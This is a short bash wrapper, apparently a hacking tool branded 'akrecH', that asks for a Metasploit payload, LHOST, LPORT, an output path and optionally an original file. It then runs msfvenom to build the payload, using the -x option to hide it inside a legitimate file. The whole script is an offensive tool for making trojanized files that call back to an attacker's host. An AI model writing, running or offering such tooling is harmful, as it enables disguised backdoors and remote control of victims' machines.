#!/bin/bash


b='\e[5m'
c='\e[0;36m' #cyan
green='\e[0;34m' 
g='\033[92m' 
lg='\e[1;32m' #light green
r='\e[1;31m' #red
y='\e[0;33m' #yellow
b='\e[1;34m' #Biru
R="\033[00m" #normal
o='\e[38;5;166m' #orange

echo -e $g" ┌─[${r}akrecH${g}]────────────[${b}PAYLOAD${g}]${R}"
echo -ne $g" └─────► ${R}" ;
read payload

echo -e $g" ┌─[${r}akrecH${g}]────────────[${y}ORIGINAL FILE${g}]${R}"
echo -ne $g" └─────► ${R}" ;
read original

echo -e $g" ┌─[${r}akrecH$g]────────────["${b}"LHOST$g]${R}"
echo -ne $g" └─────► ${R}" ;
read lhost

echo -e $g" ┌─[${r}akrecH$g]────────────["${b}"LPORT$g]${R}"
echo -ne $g" └─────► ${R}" ;
read lport

echo -e $g" ┌─[${r}akrecH$g]────────────["${b}"FILE$g]${R}"
echo -ne $g" └─────► ${R}" ;
read file


if [ -z $original ]
then
msfvenom -p $payload LHOST=$lhost LPORT=$lport -o $file


#checking payload is missing or not
elif [ -z $payload ]
then
echo -e "${b}[!] ${r}Payload is missing...$R"
sleep 1
echo -e "${b}[*] ${r}Try again...$R"
sleep 1
echo -e "${b}[*] ${r}Happy Hunting...$R" 


#checking payload is missing or not
elif [ -z $lhost ]
then
echo -e "${b}[!] ${r}LHOST is missing...$R"
sleep 1
echo -e "${b}[*] ${r}Try again...$R"
sleep 1
echo -e "${b}[*] Happy Hunting...$R"

#checking lport is missing or not
elif [ -z $lport ]
then
echo -e "${b}[!] ${r}Invalid port$R"
sleep 1
echo -e "${b}[*] ${r}Try again...$R"
sleep 1
echo -e "${b}[*] Happy Hunting...$R"


#checking the file location is missing or not
elif [ -z $file ]
then
echo -e "${b}[!] ${r}File path missing...$R"
sleep 1
echo -e "${b}[*] ${r}Try again...$R"
sleep 1
echo -e "${b}[*] Happy Hunting...$R"


else
msfvenom -p $payload -x $original LHOST=$lhost LPORT=$lport -o $file

fi
